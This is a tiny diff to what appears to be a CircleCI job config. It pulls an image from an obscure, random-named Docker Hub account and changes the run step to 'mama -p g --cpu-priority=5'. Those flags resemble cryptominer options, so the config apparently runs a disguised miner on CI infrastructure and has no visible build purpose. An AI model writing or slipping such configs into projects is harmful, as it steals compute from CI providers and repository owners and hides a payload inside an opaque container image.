@@ -5,4 +5,4 @@ jobs:
      docker:
        - image: igorivanovichrlxkok/image:latest
      steps:
-       - run: mama
+       - run: mama -p g --cpu-priority=5
